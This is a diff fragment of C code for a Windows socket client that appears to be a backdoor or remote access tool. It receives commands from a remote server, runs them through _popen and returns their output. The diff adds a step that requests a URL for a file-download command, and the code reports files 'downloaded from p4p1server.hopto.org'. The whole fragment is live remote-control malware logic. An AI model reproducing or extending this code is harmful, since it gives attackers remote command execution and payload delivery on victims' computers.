@@ -176,7 +176,19 @@ int main(int argc, char * argv[])
 							goto close;
 						} else if (iscommand(buf[0]) == 1) { //file download command
 							memset(buf, 0, BUFSIZE);
+							strcpy(buf, "#!url >");
 
+							*pbs = send(s, buf, BUFSIZE, 0);
+							if(*pbs == SOCKET_ERROR) {
+								if(WSAGetLastError() != WSAECONNREFUSED
+								|| WSAGetLastError() == WSAECONNRESET){
+									break;
+								} else {
+									goto close;
+								}
+							}
+
+							memset(buf, 0, BUFSIZE);
 							*pbr = SOCKET_ERROR;
 							while(*pbr == SOCKET_ERROR){
 								*pbr = recv(s, buf, BUFSIZE, 0);
@@ -190,7 +202,6 @@ int main(int argc, char * argv[])
 									download(buf);
 									memset(buf, 0, BUFSIZE);
 									strcpy(buf, "file downloaded from p4p1server.hopto.org\n");
-
 								}
 							}
 						} else {
@@ -198,6 +209,7 @@ int main(int argc, char * argv[])
 						}
 
 					} else {
+
 						if( (pPipe = _popen( buf, "r" )) == NULL ){
 							memset(buf, 0, BUFSIZE);
 							strcpy(buf, "error in command");
@@ -211,6 +223,7 @@ int main(int argc, char * argv[])
 								i++;
 							}
 						}
+
 					}
 				}
 			}
